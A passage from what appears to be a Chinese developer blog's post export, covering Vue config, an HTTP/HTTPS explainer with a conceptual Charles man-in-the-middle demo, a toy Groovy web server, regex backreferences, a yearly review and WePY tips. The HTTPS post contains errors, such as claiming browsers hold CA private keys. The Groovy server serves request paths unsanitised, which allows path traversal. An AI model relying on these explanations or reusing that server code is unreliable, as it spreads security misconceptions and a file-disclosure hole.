<span class="string">`@import &quot;@/variables.scss&quot;;`</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="打包后路径问题"><a href="#打包后路径问题" class="headerlink" title="打包后路径问题"></a>打包后路径问题</h3><p>在vue.config.js文件中加入’baseUrl: ‘./‘’</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    baseUrl: <span class="string">&#x27;./&#x27;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然官方说这个文件会被 @vue/cli-service 自动加载，但如果你启动项目用的是npm run serve，那么你最好使用npx vue-cli-service serve重启一下</p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈 HTTP 和 HTTPS</title>
      <link href="2019/03/21/%E6%B5%85%E8%B0%88%20HTTP%20%E5%92%8C%20HTTPS/"/>
      <url>2019/03/21/%E6%B5%85%E8%B0%88%20HTTP%20%E5%92%8C%20HTTPS/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>说起 HTTP 协议让我想起了之前做的 socket 聊天，自己定义了一套规则 比如定义一个特殊字符 socket 读到了这个特殊字符 就代表这是一整句结束 显示到界面，发送文件还定义的是一个 Magic Number 告诉 socket 不要按照字符串解析了。</p><p>现在想起来 我当时做的事情就是自定义协议 用来规范客户端和服务端的通讯 而 HTTP 协议就是干这个事情的 来规范服务器和客户端的请求&amp;响应标准。</p><h3 id="简单介绍-HTTP"><a href="#简单介绍-HTTP" class="headerlink" title="简单介绍 HTTP"></a>简单介绍 HTTP</h3><p>HTTP 是基于 TCP/IP 协议，也叫超文本传输协议(HyperText Transfer Protocol) 默认端口 80。</p><blockquote><p>在 《图解 HTTP》 书中指出正确的名字应该叫做 超文本转移协议。</p></blockquote><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li><p>请求&amp;响应: 客户端发送请求 服务器响应请求</p></li><li><p>无状态(stateless): 在传输过程中 HTTP 不会保留之前的历史信息 等待服务器响应之后 断开连接 要传输数据时必须重新连接。</p></li></ul><blockquote><p>之所以 HTTP 设计足够简单 是为了更快的处理大量事务 确保协议的可伸缩性</p></blockquote><p>因为无法保留用户的数据，所以后面引入了 cookie 机制 这里就不做介绍了。</p><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>在 HTTP 中一共 10 种命令(也就是我们现在所说的方法 Method) 来告诉服务器应该采用哪些方式处理</p><table><thead><tr><th>方法</th><th align="center">说明</th><th align="right">协议版本</th></tr></thead><tbody><tr><td>GET</td><td align="center">获取资源</td><td align="right">1.0/1.1</td></tr><tr><td>POST</td><td align="center">传输实体主体</td><td align="right">1.0/1.1</td></tr><tr><td>PUT</td><td align="center">传输文件</td><td align="right">1.0/1.1</td></tr><tr><td>HEAD</td><td align="center">获取报文首部</td><td align="right">1.0/1.1</td></tr><tr><td>DELETE</td><td align="center">删除文件</td><td align="right">1.0/1.1</td></tr><tr><td>OPTIONS</td><td align="center">查看支持的方法</td><td align="right">1.1</td></tr><tr><td>TRACE</td><td align="center">追踪路径</td><td align="right">1.1</td></tr><tr><td>CONNECT</td><td align="center">连接代理</td><td align="right">1.1</td></tr></tbody></table><blockquote><p>LINK 和 UNLINK 已经在 1.1 的版本中移除</p></blockquote><p>这里最常用的还是 GET/POST 如果你的服务是 RESTful 接口 那应该会用到 PUT/DELETE/OPTIONS</p><h3 id="报文"><a href="#报文" class="headerlink" title="报文"></a>报文</h3><p>在 HTTP 传输的信息叫做 HTTP 报文 ，报文是由 (报文首部) 和 (报文主体) 构成 它们就是由数据构成的字符串文本。  </p><h3 id="HTTPS-介绍"><a href="#HTTPS-介绍" class="headerlink" title="HTTPS 介绍"></a>HTTPS 介绍</h3><p>由于 HTTP 是明文传输，所以很容易遭到中间人攻击 ，所以使用了 SSL 来进行加密 HTTP 传输内容，SSL 和 HTTP 的组合使用 叫做 HTTPS。</p><p>它是在 HTTP 之上 添加了一层加密协议，客户端和服务端每一次传输的数据都需要经过一层特殊处理 即 加密/解密 所以在速度上逊于 HTTP，这个东西的目的只有一个: 保证你发送/接收的数据都是你的服务器在处理 ，因为在 HTTPS 没有出现之前 如何保证你接收的数据是来自你的服务器 是一个难题。</p><p>然而 SSL 并不是为了 HTTP 加密而开发的加密技术，SSL 最初是由网景公司开发 不认识？最先开发浏览器那家公司 ，3.0版本之后交给了 IETF。</p><p>我们大致了解了这两个协议之后 来看看这个 S 到底安全在哪里？</p><h3 id="对-HTTP-进行中间人攻击"><a href="#对-HTTP-进行中间人攻击" class="headerlink" title="对 HTTP 进行中间人攻击"></a>对 HTTP 进行中间人攻击</h3><blockquote><p>或许你现在正在遭受你的运营商使用中间人攻击 篡改数据 添加广告来实现盈利，这是经常发生的事情 但是放心 我的网站已加上了 HTTPS 所以不会出现这种情况。</p></blockquote><p>如果你是 windows 可以使用 Wireshark，MacOs 使用大名鼎鼎的花瓶(Charles)，</p><p>通过 Charles 进行拦截,拦截后我们能看到在 Charles 拦截时 HTTP 使用明文传输 所以我们可以利用并更改这些数据。</p><h3 id="在我攻击的那几秒中-发生了什么？"><a href="#在我攻击的那几秒中-发生了什么？" class="headerlink" title="在我攻击的那几秒中 发生了什么？"></a>在我攻击的那几秒中 发生了什么？</h3><p>HTTP 在传输的过程中 是以明文传输的，如果这里面包含了你的密码 中间人一样的能够获取到并用你的身份来进行操作，尽管有的网站对密码进行了加密 中间人只需要获取到登陆之后的 cookie 即可 来完成身份的伪造。</p><h3 id="对-HTTPS-进行中间人攻击"><a href="#对-HTTPS-进行中间人攻击" class="headerlink" title="对 HTTPS 进行中间人攻击"></a>对 HTTPS 进行中间人攻击</h3><p>这次就选用本站来做个演示。</p><p>能看到正常访问情况下 在地址的前面会带上一个小锁的标志，这代表当前的网站是安全的即使用了 HTTPS</p><p>按照同样的方法来进行中间人 但是在一开始的时候 就出现了问题</p><p>能看到在花瓶中 无法解析这个数据包 请求前面也有一个小锁的标志 接下来该怎么办呢？</p><p>这个时候就需要明白这个 S 到低做了什么？</p><h3 id="先来说一说这个-HTTPS-采用的加密算法"><a href="#先来说一说这个-HTTPS-采用的加密算法" class="headerlink" title="先来说一说这个 HTTPS 采用的加密算法"></a>先来说一说这个 HTTPS 采用的加密算法</h3><p>HTTPS 是采用 SSL 的非对称加密算法也叫公开密钥密码。</p><p>所谓非对称加密算是指加密和解密的密钥都不是同一个，明文加密后能够获取到两个密钥 一个叫做公钥(public key)在互联网进行传输的，还有一个叫做私钥(private key) ,它们应该成套出现 需要注意的是 公钥和私钥都能够用来加密和解密</p><p><strong>用公钥加密用私钥解密叫做加密传输</strong><br><strong>用私钥加密用公钥解密叫做认证签名</strong></p><p>对称加密刚好是相反，它指加密和解密秘钥都是用的同一个，通过秘钥加密明文 也通过秘钥解密密文 这种算法安全性取决于秘钥的安全性 因为秘钥一旦丢失 获取到的密文可以直接进行解密 也就无任何安全可言了。</p><p>在 HTTPS 中，如果使用了对称加密算法 那如何保证秘钥安全的送达客户端？我们又好像回到了最开始的问题 ，如果不发送秘钥 浏览器拿到了密文也无法进行解密 ，发送了秘钥中间人也能获取到 那就无意义了 这是一个死循环。</p><p>为了大家更好的理解非对称加密的特点，我举一个例子。</p><blockquote><p>我生成了一套密钥，并把公钥写在了我的网站上。(公钥公开 私钥保留)</p></blockquote><p>你现在想给我发送邮件，但是想加密邮件的内容 所以就使用了我的公钥加密了邮件的内容 并且给我发了过来</p><p>我收到邮件后发现是一串密文，我尝试用我的私钥解密 发现解开了 这个时候我就知道有人用我的公钥给我发送了邮件</p><p>以上就完成一次数据的加密传输，尽管私钥和公钥在数学上面有一些关联 但是想要破解真的是太难了。</p><p>由于 SSL 有两个密钥，发送的密文使用公钥进行加密的 私钥并不会传递 所以就有了第三方的数组认证机构 (CA,Certificate Authority),而现代浏览器比如 Chrome 在开发时就会注入主流的认证机构密钥(公钥和私钥)，所以我们如果想要给网站加上 HTTPS 支持 只需要向第三方机构申请安全证书即可 剩下的浏览器会帮我们处理。</p><p>即使这样真的可以防止中间人攻击吗？你如何保证第三方认证机构不会把证书授权给那些不法分子呢？因为信仰不同？ 你想多了 只要赚钱 这些第三方一样的会把证书发布给他们。在花瓶中 是能够处理 HTTPS 的数据包 因为花瓶自带了证书(笑)</p><p>先来打开 SSL 代理</p><p>看到了吗？我们一样能够获取到内容，那有的人就会问了 不是说 HTTPS 可以保证安全吗？为什么还能够进行中间人攻击？ 接下来就要介绍 SSL 的第二个特征</p><h3 id="SSL-数字证书"><a href="#SSL-数字证书" class="headerlink" title="SSL 数字证书"></a>SSL 数字证书</h3><p>上面说到过 ，使用私钥加密用公钥解密的表示认证签名 还是举一个例子来说明</p><blockquote><p>我发布了一篇文章，这个时候如何证明文章是我本人发的？我会在文章最底部留下一串密文</p></blockquote><p>这个密文是通过文章内容 MD5 之后的密文 然后再通过我的私钥加密的<br>private_key.encode(MD5.encode(article.content));</p><p>大家因为都有我的公钥，所以去尝试解密 如果这里解密失败 不用想了 不是我发的，如果解密成功发现得到了一串 MD5 然后自己加密文章内容 看一看出来的结果是不是我给的 MD5 如果正确就代表这篇文章确实是我本人发的 如果不正确就是被中间人修改了。</p><p>因为中间人并不知道我的私钥，一旦文章的内容发生改变 MD5 值就会发生改变，匹配不上 大家自然知道这个文章并不是本所发 如果这个时候中间人自作聪明独自修改了我给的密文 ，那就更简单了 只要它修改了 大家都有我的公钥 通过我的公钥必定解密失败 解密都失败了 那就更不是本人发的了。</p><p>这个就是数字证书的作用: 确保数据不被中间人修改。</p><p>介绍完了数字证书，继续演示中间人攻击</p><p>如果你使用的是 Chrome</p><p>能看到浏览器已经知道当前网站被中间人攻击了。</p><h3 id="HTTPS-使用了混淆加密"><a href="#HTTPS-使用了混淆加密" class="headerlink" title="HTTPS 使用了混淆加密"></a>HTTPS 使用了混淆加密</h3><p>因为 HTTPS 在性能上远不如 HTTP，大概是 2-100 倍 但是使用者基本感觉不到 为什么？ 因为1毫秒的100倍也才100毫秒 谁能感觉到呀！</p><p>不过 HTTPS 还是给出了一个比较合理的解决方法，即混淆加密。</p><p>什么是混淆加密？我在来举个例子</p><blockquote><p>我和一个小伙伴使用加密的方式聊天，比如使用微信</p></blockquote><p>但是我发现每次都要用私钥解密 公钥加密就太麻烦了呀！</p><p>所以我们规定 在第一次发送消息的时候 我们采用非对称加密的方式，然后把对称加密方式的密钥放进来(比如 DES)</p><p>后面我们聊天就不用这么麻烦了，因为我们拿到了一个对称加密的密钥 后面的消息过来只需要 decode 就行了 也不用验证是不是对方发过来的 ，因为每次的首次会话 都会改变对称密钥 这样轻松多了。</p><h3 id="自造-HTTPS-的可能？"><a href="#自造-HTTPS-的可能？" class="headerlink" title="自造 HTTPS 的可能？"></a>自造 HTTPS 的可能？</h3><p>最近在知乎上面看了这个问题，所谓 无知者无畏 为什么我们不能自己造轮子呢？</p><blockquote><p>我们自己定义一套协议 并且不公开 只有公司自己知道加密方式和解密方式 有没有这个可能？</p></blockquote><p>我想这个问题 没有对错 有兴趣的同学可以去知乎看看。</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>真实的情况可能远远比我文章说的复杂，但是希望这篇文章能让你基本了解 http 和 https 的区别，学无止境。</p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>50 行代码实现一个简单的 WEB 服务器</title>
      <link href="2019/02/12/50%20%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%20WEB%20%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>2019/02/12/50%20%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%20WEB%20%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：这里的简单是只实现网站根目录的访问，一个完整的 WEB 服务器实现是很复杂的 可参考 nginx。</p></blockquote><p>WEB 服务器的原理是先监听一个 Socket 端口，当 TCP 请求完成握手之后 然后根据 HTTP 协议完成通讯。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">HTTP_PORT = <span class="number">9999</span></span><br><span class="line">HTTP_ROOT = <span class="string">&#x27;/Users/kanshan/gitProjects/Coder&#x27;</span></span><br><span class="line"></span><br><span class="line">def server = <span class="keyword">new</span> ServerSocket(HTTP_PORT)</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    def socket = server.accept()</span><br><span class="line">    <span class="keyword">new</span> Thread(&#123;</span><br><span class="line">        def input = socket.inputStream</span><br><span class="line">        def output = socket.outputStream</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            def outMessage = handler(parserRequest(input))</span><br><span class="line">            output.write(outMessage.getBytes())</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception ex)&#123;</span><br><span class="line">            println ex</span><br><span class="line">        &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            input.close()</span><br><span class="line">            output.flush()</span><br><span class="line">            output.close()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">as</span> Runnable).start()</span><br><span class="line">&#125;</span><br><span class="line">def <span class="function"><span class="title">parserRequest</span>(<span class="params">InputStream input</span>)</span>&#123;</span><br><span class="line">    def reader = input.newReader()</span><br><span class="line">    def protocol = []</span><br><span class="line">    <span class="keyword">while</span>(reader.ready())&#123;</span><br><span class="line">        def line = reader.readLine()</span><br><span class="line">        <span class="keyword">if</span>(!line.isBlank()) protocol &lt;&lt; line</span><br><span class="line">    &#125;</span><br><span class="line">    def firstLine = protocol[<span class="number">0</span>].split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    def wrapper = [:]</span><br><span class="line">    wrapper.method = firstLine[<span class="number">0</span>]</span><br><span class="line">    wrapper.router = firstLine[<span class="number">1</span>]</span><br><span class="line">    wrapper.version = firstLine[<span class="number">2</span>]</span><br><span class="line">    <span class="number">1.</span><span class="function"><span class="title">upto</span>(<span class="params">protocol.size() - <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">        def kv = protocol[it].split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        wrapper.<span class="string">&quot;$&#123;kv[0]&#125;&quot;</span> = kv[<span class="number">1</span>].trim()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line">&#125;</span><br><span class="line">def <span class="function"><span class="title">handler</span>(<span class="params">wrapper</span>)</span>&#123;</span><br><span class="line">    def buffer = <span class="keyword">new</span> StringBuffer()</span><br><span class="line">    buffer.append(<span class="string">&quot;$&#123;wrapper.version&#125; 200 OK\r\n&quot;</span>)</span><br><span class="line">    buffer.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    buffer.append(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    def file = <span class="keyword">new</span> File(<span class="string">&quot;$&#123;HTTP_ROOT&#125;$&#123;File.separator&#125;$&#123;wrapper.router&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(!file.isDirectory() &amp;&amp; file.exists() &amp;&amp; file.canRead())&#123;</span><br><span class="line">        buffer.append(file.text)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buffer.toString()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>之后可以考虑使用 NIO 实现。</p></blockquote><p>以上就是全部的代码，这里监听的是 9999 端口，设置网站根目录为: /Users/kanshan/gitProjects/Coder，改兴趣可以拷贝到 app.groovy 中，使用 groovy app.groovy 运行。</p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Javascript正则的&#39;反向引用&#39;</title>
      <link href="2019/01/12/%E5%85%B3%E4%BA%8EJavascript%E6%AD%A3%E5%88%99%E7%9A%84&#39;%E5%8F%8D%E5%90%91%E5%BC%95%E7%94%A8&#39;/"/>
      <url>2019/01/12/%E5%85%B3%E4%BA%8EJavascript%E6%AD%A3%E5%88%99%E7%9A%84&#39;%E5%8F%8D%E5%90%91%E5%BC%95%E7%94%A8&#39;/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言: 本来是在看着阿树博客里的js规范的，不知道怎么搞得，稀里糊涂的就看到正则去了，把学到的东西总结一下。</p></blockquote><h3 id="首先先看下面这个例子："><a href="#首先先看下面这个例子：" class="headerlink" title="首先先看下面这个例子："></a>首先先看下面这个例子：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;abcd&quot;</span>.match(<span class="regexp">/(a(bc)d)/</span>);</span><br><span class="line"><span class="comment">//result: [&quot;abcd&quot;, &quot;abcd&quot;, &quot;bc&quot;]</span></span><br></pre></td></tr></table></figure><p>这个例子说明看括号匹配顺序是按左括号计算的。（这是别人的理解，我的理解是匹配顺序是按从外到里从左到右计算的，每个反向引用都由一个编号或名称来标识，并通过“\编号”表示法进行引用，外面的组的编号靠前。也就是说引用分组是编号排列是从外到内编排。）</p><h3 id="再看这个例子"><a href="#再看这个例子" class="headerlink" title="再看这个例子"></a>再看这个例子</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;aaa&#x27;</span>.match(<span class="regexp">/(a\1)/</span>);</span><br><span class="line"><span class="comment">//result: [&#x27;a&#x27;]  </span></span><br><span class="line"><span class="string">&#x27;aaaaaaa&#x27;</span>.match(<span class="regexp">/(a\1\1\1\1\1)/</span>);  </span><br><span class="line"><span class="comment">//result: [&#x27;a&#x27;]</span></span><br></pre></td></tr></table></figure><p>由这个例子可以看出/(a\1)/在第一个括号中使用\1引用是没有意义的，同时在chrome中的测试结果表明，无论在第n个括号中有几个\n都会被忽略。（既从最外层括号往里层数）</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>基于上述两个例子的解读，咱们可以把下边的例子进行转换</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;aaabbbcccdddeeefff&#x27;</span>.match(<span class="regexp">/[abc]\1/g</span>);<span class="comment">//null  </span></span><br><span class="line"><span class="string">&#x27;aaabbbcccdddeeefff&#x27;</span>.match(<span class="regexp">/([abc])\1/g</span>);<span class="comment">//[&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;]  </span></span><br><span class="line"><span class="string">&#x27;aaabbbcccdddeeefff&#x27;</span>.match(<span class="regexp">/(([abc])\1)\1/g</span>);<span class="comment">//[&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;]  </span></span><br><span class="line"><span class="string">&#x27;aaabbbcccdddeeefff&#x27;</span>.match(<span class="regexp">/(([abc])\1)\2/g</span>);<span class="comment">//[&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;]  </span></span><br><span class="line"><span class="string">&#x27;aaabbbcccdddeeefff&#x27;</span>.match(<span class="regexp">/((([abc])\1)\2)\3/g</span>);<span class="comment">//[&quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;]</span></span><br></pre></td></tr></table></figure><p>可简化为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;aaabbbcccdddeeefff&#x27;</span>.match(<span class="regexp">/[abc]\1/g</span>);<span class="comment">//null  </span></span><br><span class="line"><span class="string">&#x27;aaabbbcccdddeeefff&#x27;</span>.match(<span class="regexp">/([abc])\1/g</span>);<span class="comment">//[&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;]  </span></span><br><span class="line"><span class="string">&#x27;aaabbbcccdddeeefff&#x27;</span>.match(<span class="regexp">/(([abc]))\1/g</span>);<span class="comment">//[&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;]  </span></span><br><span class="line"><span class="string">&#x27;aaabbbcccdddeeefff&#x27;</span>.match(<span class="regexp">/(([abc]))\2/g</span>);<span class="comment">//[&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;]  </span></span><br><span class="line"><span class="string">&#x27;aaabbbcccdddeeefff&#x27;</span>.match(<span class="regexp">/((([abc]))\2)\3/g</span>);<span class="comment">//[&quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;]</span></span><br></pre></td></tr></table></figure><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ul><li><a href="https://segmentfault.com/q/1010000000580762">如何理解javascript正则“反向引用”</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018年个人总结</title>
      <link href="2019/01/05/2018%E5%B9%B4%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/"/>
      <url>2019/01/05/2018%E5%B9%B4%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="工作方面"><a href="#工作方面" class="headerlink" title="工作方面"></a>工作方面</h3><p>2018这一年说快也不快，说慢也不慢，风风火火的赶了几个月项目，期间又不间断的穿插 H5 营销项目的开发，说实在的，个人并不喜欢快餐式的开发，任何一个惊艳全场的产品势必需要经过千锤百炼。</p><p>很庆幸，今年研发的主要精力放在产品上，有机会对现有项目进行迭代改造，从 vue1 到 vue2，从代码杂乱无章到 eslint 规范编码，从 bug 百出到单元测试，一步步规范工作流程，一步步朝正规军方向前进。唯一的遗憾是没能在项目中孵化点什么开源项目来，总归差了点什么。</p><p>在今年的后半段，开始负责前端开发小组的日常管理，埋头撸了一年代码抬头才发现自己对管理一窍不通，再加之生性放浪，不愿受约束更不愿约束别人，很多时候工作都有点乱糟糟的感觉。哎，躲了这么多年，终归得面对，是时候吭哧吭哧的补一波管理能力了。</p><p>今年后半段还带了一个实习生（玉米）妹子，由于第一次带实习生，再加上妹子以及指导经验的缺失，导致前期过份放松，后期又不停施压的情况发生，妹子承受不了请辞，想来也是我的责任吧！抽时间得好好反思下。</p><h3 id="学习方面"><a href="#学习方面" class="headerlink" title="学习方面"></a>学习方面</h3><h5 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h5><p>2018对于学习来说算是一个半糟糕的一年，技能较之去年并无明显进步，仅有岁数。</p><p>追随 vue 从 2 到现在 3，回头才发现把其余两大框架都给落下了，19年得在这基础上好好补补。</p><p>去年立的前端可视化(canvas、webGL)的 flag还没能填上，希望18年能把坑给填咯。</p><p>原定计划用来补充基本知识的书籍 《深入理解计算机系统》《算法导论》《TCP/IP协议》 迟迟没有开封（- -贼尴尬）。</p><p>通过 《鸟哥的Linux私房菜》 补充了下 linux 的基础，买了自己的服务器，也搭建了自己的个人站点，但关于 linux 的知识还是需要进一步加强。</p><p>今年通过同步翻译官方文档去学习强化 node.js，虽然最后翻译阉割了，但还是学到了很多服务端的知识，遗憾的是不熟悉 c++ ，无法进一步学习源码。</p><h5 id="读书"><a href="#读书" class="headerlink" title="读书"></a>读书</h5><p>18年没看几本书，绝大部分还都是技术书籍，不过庆幸还读完了《与中国打交道》这本书，尝试着用不同的角度去看待世界。</p><p>来年的想读的书基本在微信读书上，希望能有机会把书架看完。</p><h3 id="生活方面"><a href="#生活方面" class="headerlink" title="生活方面"></a>生活方面</h3><p>今年发生了两件影响我生活的大事，第一件的是正式从小伙伴们因为工作打散，开始了独租生活，除了电脑还是电脑，有时候还真有点落寞。第二件事呢，则是在茫茫人海捞到了我家领导，正式脱离广大程序猿队伍（A_A）。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>2018吧，忧喜参半，2019呢，前路漫漫，他大爷还是他大爷，挖的坑，该填还是得填！</p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序wepy框架+minui踩坑之路</title>
      <link href="2018/10/13/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8Fwepy%E6%A1%86%E6%9E%B6-minui%E8%B8%A9%E5%9D%91%E4%B9%8B%E8%B7%AF/"/>
      <url>2018/10/13/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8Fwepy%E6%A1%86%E6%9E%B6-minui%E8%B8%A9%E5%9D%91%E4%B9%8B%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：wepy框架类似Vue的MVVM开发模式，并且支持promise与ES7 asnyc异步函数，记录一下项目开发过程中遇到的坑</p></blockquote><h3 id="minUI"><a href="#minUI" class="headerlink" title="minUI"></a>minUI</h3><p>由于minUI与wepy框架兼容性较好，而且支持单组件导入，所以选择了minUI，使用方式官网有写，需要的组件直接npm安装即可，不过要注意的是，它的form组件对form表单提交支持性并不好，如果想要提交表单还是建议原生或者使用异步提交：</p><h5 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h5><blockquote><p>小程序组件系统中组件是隔离的，所以提交表单时无法用 form 表单获取输入框中的值，只能单独获取</p></blockquote><p>minUI中的button组件并不支持disabled禁用(或者我没看懂文档，至少直接写disabled不行)。</p><p>minUI中的很多组件样式是无法通过style或者class控制的，所以如果有需要，可以进入packages，找到组件的wxss自行添加。</p><p>minUI可以和原生组件一起使用，例如原生scroll-view+minUI中的list。</p><h3 id="wepy"><a href="#wepy" class="headerlink" title="wepy"></a>wepy</h3><ol><li>wepy的组件与父级css是共用的，也就是说主页面中的css组件也可以使用。</li><li>发送广播是向子组件传输数据的重要手段，而且子组件中的events可以当成子组件的生命周期函数使用(类似子组件的 onLoad)。</li><li>在组件中写生命周期其实是调用组件页面的生命周期，所以就像文档说的不需要写生命周期函数。</li><li>页面调用全局是this.globalData.*，组件调用全局变量是this.$parent.globalData.*，组件中的组件调this.$parent.$parent.*，此类推。</li><li>子组件所需要引入的UI组件/其他组件，都写在父级页面的usingComponents中，注意路径不要写错。</li><li>由于第一次用，所以刚开始修改了dist文件导致项目崩溃(其实人也很崩溃)，然后就是一个漫长的恢复项目的过程，重新cli等，但是发现还是不成功，显示页面构建失败之类的，刚开始发现忘了装async的pollyfill，npm后还是报错，最后查阅资料发现是babel的配置出了问题，于是乎修改了wepy.config.json再次编译如果显示UI组件找不到，路径正确的情况下可能是未开启微信小程序ide的ES6转ES5，最后再次build终于成功，所以请勿修改dist文件夹！</li><li>不知道是不是build –watch的问题，在编译中添加文件后，删除/重命名文件都无效，只要被build进去的文件无法通过再次build删除(无奈)，所以最后上传小程序时，我采用的方法是将dist文件单拎出来，对其中无效(被删除/重命名)的文件进行整理，最后记得整理app.json文件，最后进行上传即可。注：其中_wepylogs.js文件是用来记录错误的，在wepy编译中最后一次错误会被记录在这里，上传之前记得清除一下。</li></ol><h3 id="Echarts"><a href="#Echarts" class="headerlink" title="Echarts"></a>Echarts</h3><p>这个参考一位大佬所写的方法：</p><p><a 